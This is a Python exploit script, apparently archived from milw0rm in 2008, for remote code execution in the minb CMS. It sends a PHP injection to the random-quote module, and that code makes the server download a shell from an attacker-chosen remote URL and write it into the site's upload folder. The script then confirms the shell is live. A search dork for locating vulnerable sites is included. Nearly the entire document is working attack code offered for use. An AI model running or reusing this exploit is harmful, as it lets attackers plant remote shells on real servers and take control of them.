#!/usr/bin/python
#####################################################################################
####                     minb Remote Code Execution Exploit                      ####
#####################################################################################
#                                                                                   #
#AUTHOR : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                                      #
#Discovered by : IRCRASH (R3d.W0rm (Sina Yazdanmehr))                               #
#Our Site : Http://IRCRASH.COM                                                      #
#IRCRASH Team Members : Dr.Crash - R3d.w0rm (Sina Yazdanmehr)                       #
#####################################################################################
#                                                                                   #
#Site : http://minb.sf.net                                                          #
#                                                                                   #
#Download : http://switch.dl.sourceforge.net/sourceforge/minb/minb-0.1.0.tar.bz2    #
#                                                                                   #
#DORK : Powered by minb                                                             #
#                                                                                   #
#####################################################################################
#                                     [Note]                                        #
#                                                                                   #
#All php file in this cms have this bug ;)                                          #
#                                                                                   #
#####################################################################################
#                             Site : Http://IRCRASH.COM                             #
###################################### TNX GOD ######################################
import sys,urllib
if len(sys.argv)<3 :
    print "minb Remote code Execution Exploit"
    print "Powered by : R3d.W0rm"
    print "www.IrCrash.com"
    print "Usage : " + sys.argv[0] + " http://Target/path http://evil/shell.txt"
    print "Ex. " + sys.argv[0] + " http://site.com/minb http://r3d.a20.ir/r.txt"
    exit()
if 'http://' not in sys.argv[1] :
    sys.argv[1]='http://' + sys.argv[1]
if 'http://' not in sys.argv[2] :
    sys.argv[2]='http://' + sys.argv[2]
fp='/include/modules/top/1-random_quote.php?parse=r3d.w0rm'
data=urllib.urlencode({'quotes_to_edit':'quotes_to_edit=";$s=fopen(\'' + sys.argv[2] + '\',r);while(!feof($s)){$shell.=fread($s,1024);};fclose($s);$fp=fopen(\'../../../upload/pictures/r3d.w0rm.php\',\'w+\');fwrite($fp,$shell);fclose($fp);/*'})
urllib.urlopen(sys.argv[1] + fp,data)
urllib.urlopen(sys.argv[1] + fp)
test=urllib.urlopen(sys.argv[1] + '/upload/pictures/r3d.w0rm.php').read()
if 'Not Found' not in test :
    print "Shell Uploaded ."
    print sys.argv[1] + '/upload/pictures/r3d.w0rm.php'
exit()

# milw0rm.com [2008-09-11]